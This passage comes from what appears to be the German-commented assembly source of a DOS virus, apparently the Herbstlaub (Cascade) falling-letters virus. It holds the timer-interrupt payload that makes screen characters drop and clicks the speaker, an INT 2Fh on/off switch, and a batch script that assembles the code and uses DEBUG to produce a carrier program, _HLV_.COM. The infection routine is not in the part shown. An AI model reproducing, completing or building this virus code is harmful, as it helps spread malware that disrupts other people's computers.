		SAVE	DI,ES,DX,BX			;
		MOV	BX,AX				;
		MOV	AL,DH				;
		MUL	[Num_of_Col]			;
		MOV	DH,0				;
		ADD	AX,DX				;
		SHL	AX,1				;
		ADD	AX,[Page_offset]		;
		MOV	DI,AX				;
		TEST	[Prevent_Snow?],-1		;
		MOV	ES,[Seg_of_VRAM]		;
		JZ	XI_039				;
		Wait_HRI_or_VRI 			;
XI_039: 	MOV	AX,BX				;
		STOSB					;
		STI					;
		REST	BX,DX,ES,DI			;
		RET					;
Write_to_VRAM	ENDP					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Bit 0 von Port B des 8255 Chips zur│cksetzen (IO-Adresse : &H61 ).     Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Toggle_Speaker	PROC	NEAR				;
		PUSH	AX				;
		IN	AL,PORT_B_8255			;
		XOR	AL,02				;
		AND	AL,0FE				;
		OUT	PORT_B_8255,AL			;
		POP	AX				;
		RET					;
Toggle_Speaker	ENDP					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	CF gesetzt, wenn AL ein nicht darstellbares Zeichen enth└lt.           Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Is_it_blank_?	PROC	NEAR				;
		CMP	AL,0				;
		JZ	XI_040				;
		CMP	AL,20				;
		JZ	XI_040				;
		CMP	AL,-1				;
		JZ	XI_040				;
		CLC					;
		RET					;
XI_040: 	STC					;
		RET					;
Is_it_blank_?	ENDP					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	CF gesetzt, wenn AL ein Zeichen aus dem Linienzeichensatz enth└lt.     Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Spec_Graphik?	PROC	NEAR				;
		CMP	AL,0B0				;
		JB	XI_041				;
		CMP	AL,0DF				;
		JA	XI_041				;
		STC					;
		RET					;
XI_041: 	CLC					;
		RET					;
Spec_Graphik?	ENDP					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Geschwindigkeit der Maschine ( zur Verwendung in DELAY ) ermitteln.    Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
GetSysSpeed	PROC	NEAR				;
		PUSH	DS				;
		MOV	AX,BIOSDATASEG			;
		MOV	DS,AX				;
		STI					;
		MOV	AX,[B_TIMERVAR] 		;
XI_042: 	CMP	AX,[B_TIMERVAR] 		;
		JZ	XI_042				;
		XOR	CX,CX				;
		MOV	AX,[B_TIMERVAR] 		;
XI_043: 	INC	CX				;
		JZ	XI_045				;
		CMP	AX,[B_TIMERVAR] 		;
		JZ	XI_043				;
XI_044: 	POP	DS				;
		MOV	AX,CX				;
		XOR	DX,DX				;
		MOV	CX,0F				;
		DIV	CX				;
		MOV	CS:[Speed],AX			;
		RET					;
XI_045: 	DEC	CX				;
		JMP	XI_044				;
GetSysSpeed	ENDP					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Verz■gern ( Verz■gerungszeit ist kaum maschinenabh└ngig ).             Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Delay		PROC	NEAR				;
		PUSH	CX				;
XI_046: 	PUSH	CX				;
		MOV	CX,[Speed]			;
XI_047: 	LOOP	XI_047				;
		POP	CX				;
		LOOP	XI_046				;
		POP	CX				;
		RET					;
Delay		ENDP					;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Eine neue Interrupt 1C(h) Behandlungsroutine.			       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
XI_048		LABEL	NEAR				;
XR_009		EQU	XI_048 + PSPsize		;----------;
		TEST	CS:[ISR_Flags],MASK R_in_1c OR MASK ExtCom ;
		JZ	XI_049				;----------;
		JMP	XI_067				;
XI_049: 	OR	CS:[ISR_Flags],MASK R_in_1c	;
		DEC	CS:[XR_002]			;
		JZ	XI_050				;
		JMP	XI_066				;
XI_050: 	SAVE	DS,ES				;
		MOV_S	DS,CS				;
		MOV_S	ES,CS				;
		SAVE	AX,BX,CX,DX,SI,DI,BP		;
		MOV	AL,EOI_8259A			;
		OUT	PORT_B_8259A,AL 		;
		MOV	AX,[XR_003]			;
		CMP	AX,0438 			;
		JNB	XI_051				;
		MOV	AX,0438 			;
XI_051: 	CALL	Random				;
		INC	AX				;
		MOV	[XR_002],AX			;
		MOV	[XR_003],AX			;
		PUSH	DS				;
		MOV	AX,BIOSDATASEG			;
		MOV	DS,AX				;
		MOV	AX,[B_VidPage]			;
		POP	DS				;
		MOV	[Page_offset],AX		;
		MOV	[Last_Line],18			;
		MOV	DL,-1				;
		MOV	AX,1130 			;
		MOV	BH,0				;
		SAVE	ES,BP				;
		INT	10				;
		REST	BP,ES				;
		CMP	DL,-1				;
		JZ	XI_052				;
		MOV	[Last_Line],DL			;
XI_052: 	CALL	GetSysSpeed			;
		MOV	AH,0F				;
		INT	10				;
		MOV	[Num_of_Col],AH 		;
		MOV	[Prevent_Snow?],0		;
		MOV	[Seg_of_VRAM],MonoBase		;
		CMP	AL,07				;
		JZ	XI_054				;
		JB	XI_053				;
		JMP	XI_064				;
XI_053: 	MOV	[Seg_of_VRAM],ColorBase 	;
		CMP	AL,03				;
		JA	XI_054				;
		CMP	AL,02				;
		JB	XI_054				;
		MOV	[Prevent_Snow?],01		;
		MOV	AL,[Last_Line]			;
		INC	AL				;
		MUL	[Num_of_Col]			;
		MOV	[Num_of_char],AX		;
		MOV	AX,[XR_004]			;
		CMP	AX,[Num_of_char]		;
		JBE	XI_054				;
		MOV	AX,[Num_of_char]		;
XI_054: 	CALL	Random				;
		INC	AX				;
		MOV	SI,AX				;
XI_055: 	XOR	DI,DI				;
XI_056: 	INC	DI				;
		MOV	AX,[Num_of_char]		;
		SHL	AX,1				;
		CMP	DI,AX				;
		JBE	XI_057				;
		JMP	XI_064				;
XI_057: 	OR	[ISR_Flags],MASK Recf_1 	;
		MOV	AL,[Num_of_Col] 		;
		MOV	AH,0				;
		CALL	Random				;
		MOV	DL,AL				;
		MOV	AL,[Last_Line]			;
		MOV	AH,0				;
		CALL	Random				;
		MOV	DH,AL				;
		CALL	Load_from_VRAM			;
		CALL	Is_it_blank_?			;
		JB	XI_056				;
		CALL	Spec_Graphik?			;
		JB	XI_056				;
		MOV	[Last_Pair],AX			;
		MOV	CL,[Last_Line]			;
		MOV	CH,0				;
XI_058: 	INC	DH				;
		CMP	DH,[Last_Line]			;
		JA	XI_062				;
		CALL	Load_from_VRAM			;
		CMP	AH,[Last_Attr]			;
		JNZ	XI_062				;
		CALL	Is_it_blank_?			;
		JB	XI_060				;
XI_059: 	CALL	Spec_Graphik?			;
		JB	XI_062				;
		INC	DH				;
		CMP	DH,[Last_Line]			;
		JA	XI_062				;
		CALL	Load_from_VRAM			;
		CMP	AH,[Last_Attr]			;
		JNZ	XI_062				;
		CALL	Is_it_blank_?			;
		JNB	XI_059				;
		CALL	Toggle_Speaker			;
		DEC	DH				;
		CALL	Load_from_VRAM			;
		MOV	[Last_Char],AL			;
		INC	DH				;
XI_060: 	AND	[ISR_Flags],NOT MASK Recf_1	;
		DEC	DH				;
		MOV	AL,' '				;
		CALL	Write_to_VRAM			;
		INC	DH				;
		MOV	AL,[Last_Char]			;
		CALL	Write_to_VRAM			;
		JCXZ	XI_061				;
		CALL	Delay				;
		DEC	CX				;
XI_061: 	JMP	XI_058				;
XI_062: 	TEST	[ISR_Flags],MASK Recf_1 	;
		JZ	XI_063				;
		JMP	XI_056				;
XI_063: 	CALL	Toggle_Speaker			;
		DEC	SI				;
		JZ	XI_064				;
		JMP	XI_055				;
XI_064: 	IN	AL,PORT_B_8255			;
		AND	AL,0FC				;
		OUT	PORT_B_8255,AL			;
		MOV	AX,3				;
		CALL	Random				;
		INC	AX				;
		MUL	[XR_004]			;
		JNB	XI_065				;
		MOV	AX,-1				;
XI_065: 	MOV	[XR_004],AX			;
		REST	BP,DI,SI,DX,CX,BX,AX,ES,DS	;
XI_066: 	AND	CS:[ISR_Flags],NOT MASK R_in_1c ;
XI_067: 	JMP	DWORD PTR CS:[Org_Int_1C]	;
							;
IF	SWITCHABLE					;
							;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Implementierung eines neuen in CMD_2F definierten internen Befehls.    Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
XI_068		Label	Near				;
Int_2F_ISR	EQU	XI_068 + PSPsize		;
		CMP	AH,0AEH 			;
		JNZ	Int_2F_end			;
		CMP	DX,-1				;
		JNZ	Int_2F_end			;
		CMP	AL,0				;
		JNZ	Int_2F_2nd			;
		CALL	Decode_2F			;
		JNZ	Int_2F_end			;
		DEC	AL				;
		IRET					;
Int_2F_2nd:	CMP	AL,1				;
		JNZ	Int_2F_end			;
		CALL	Decode_2F			;
		JNZ	Int_2F_end			;
		SAVE	DS,DX,AX			;
		MOV_S	DS,CS				;
		XOR	[ISR_Flags],MASK ExtCom 	;
		MOV	DX,OFFSET MSG_ON		;
		TEST	[ISR_Flags],MASK ExtCom 	;
		JZ	XI_069				;
		MOV	DX,OFFSET MSG_OFF		;
XI_069: 	MOV	AH,9				;
		MSDOS					;
		REST	AX,DX,DS			;
		AND	BYTE PTR [SI],0 		;
		IRET					;
Int_2F_end:	JMP	DWORD PTR CS:[Org_Int_2F]	;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	 berpr│fen, ob der in CMD_2F definierte Befehl angesprochen wurde.     Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
Decode_2F	PROC	NEAR				;
		SAVE	SI,DI,ES,CX			;
		MOV	CX,05				;
		MOV_S	ES,CS				;
		MOV	DI,OFFSET Cmd_2F		;
		CLD					;
		REPE	CMPSW				;
		REST	CX,ES,DI,SI			;
		RET					;
Decode_2F	ENDP					;
							;
ENDIF							;
		comment 				#
здддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд©
Ё	Okay, das war's. Zum SchluА noch einige Definitionen.		       Ё
юдддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддды
		#					;
EOFC		EQU	THIS WORD			;
XR_010		EQU	OFFSET EOFC - 1 + FIRSTBASE	;
TEXT		ENDS					;
IF2							;----------------;
%Out	╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨
%Out	хмммммммм (C) 1990 164A12565AA18213165556D3125C4B962712 ммммммммм╪
ENDIF									 ;
comment 								 #
имммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм╩
╨									       ╨
╨ So k■nnte ein Batch - Makefile aussehen :                                    ╨
╨                                                                              ╨
╨ @cls                                                                         ╨
╨ @if  %1.==.                     goto nopar                                   ╨
╨ @if  not exist %1.asm           goto noasm                                   ╨
╨ @ctty nul                                                                    ╨
╨ @del %1.obj                                                                  ╨
╨ @del %1.lst                                                                  ╨
╨ @del %1.crf                                                                  ╨
╨ @del %1.ref                                                                  ╨
╨ @del %1.map                                                                  ╨
╨ @del %1.exe                                                                  ╨
╨ @del %1.bin                                                                  ╨
╨ @del _HLV_.COM                                                               ╨
╨ @ctty con                                                                    ╨
╨ @masm /b63 %1,,%1,%1 %2 %3 %4;                                               ╨
╨ @if not exist %1.obj            goto masm_err                                ╨
╨ @link %1,,%1;                                                                ╨
╨ @if not exist %1.exe            goto link_err                                ╨
╨ @exe2bin %1;                                                                 ╨
╨ @if not exist %1.bin            goto exe2_err                                ╨
╨ @cref %1;                                                                    ╨
╨ @if not exist %1.ref            goto cref_err                                ╨
╨ @echo  			>> %1.lst                                      ╨
╨ @copy %1.lst+%1.map+%1.ref %1.t >  nul                                       ╨
╨ @del %1.lst 			>  nul                                         ╨
╨ @ren %1.t %1.lst 		>  nul                                         ╨
╨ @del %1.obj 			>  nul                                         ╨
╨ @del %1.crf 			>  nul                                         ╨
╨ @del %1.ref 			>  nul                                         ╨
╨ @del %1.map 			>  nul                                         ╨
╨ @del %1.exe 			>  nul                                         ╨
╨ @echo n %1.bin          	>  md.inp                                      ╨
╨ @echo l 11f             	>> md.inp                                      ╨
╨ @echo a 110             	>> md.inp                                      ╨
╨ @echo add cx,20         	>> md.inp                                      ╨
╨ @echo.                  	>> md.inp                                      ╨
╨ @echo g =110 113        	>> md.inp                                      ╨
╨ @echo f 110 11e 20      	>> md.inp                                      ╨
╨ @echo e 110 '%1'        	>> md.inp                                      ╨
╨ @echo f 100 10f 90      	>> md.inp                                      ╨
╨ @echo a 100             	>> md.inp                                      ╨
╨ @echo jmp 120           	>> md.inp                                      ╨
╨ @echo nop               	>> md.inp                                      ╨
╨ @echo nop               	>> md.inp                                      ╨
╨ @echo nop               	>> md.inp                                      ╨
╨ @echo mov ax,4c00       	>> md.inp                                      ╨
╨ @echo int 21            	>> md.inp                                      ╨
╨ @echo.                  	>> md.inp                                      ╨
╨ @echo n _HLV_.com       	>> md.inp                                      ╨
╨ @echo w                 	>> md.inp                                      ╨
╨ @echo q                 	>> md.inp                                      ╨
╨ @debug                  	<  md.inp  > nul                               ╨
╨ @cls                                                                         ╨
╨ @echo.                                                                       ╨
╨ @echo   имммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм╩   ╨
╨ @echo   ╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨   ╨
╨ @echo   ╨╟╟╟╟╟╟╟MAKEHLV erfolgreich beendet, _HLV_.com wurde erstellt.╟╟╟╨   ╨
╨ @echo   ╨╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╨   ╨
╨ @echo   хмммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм╪   ╨
╨ @echo.                                                                       ╨
╨ @goto ende                                                                   ╨
╨ :nopar                                                                       ╨
╨ @echo FEHLER !    Mindestens ein Parameter ist erforderlich !                ╨
╨ @echo Syntax :    MAKEHLV asmfile [switches]                                 ╨
╨ @goto ende                                                                   ╨
╨ :noasm                                                                       ╨
╨ @echo FEHLER !    Die Datei %1.ASM ist nicht zu finden !                     ╨
╨ @goto ende                                                                   ╨
╨ :masm_err                                                                    ╨
╨ @echo FEHLER !    %1.OBJ konnte nicht erstellt werden !                      ╨
╨ @goto ende                                                                   ╨
╨ :link_err                                                                    ╨
╨ @echo FEHLER !    %1.EXE konnte nicht erstellt werden !                      ╨
╨ @goto ende                                                                   ╨
╨ :exe2_err                                                                    ╨
╨ @echo FEHLER !    %1.BIN konnte nicht erstellt werden !                      ╨
╨ @goto ende                                                                   ╨
╨ :cref_err                                                                    ╨
╨ @echo FEHLER !    %1.REF konnte nicht erstellt werden !                      ╨
╨ :ende                                                                        ╨
╨									       ╨
хмммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм╪
#
END
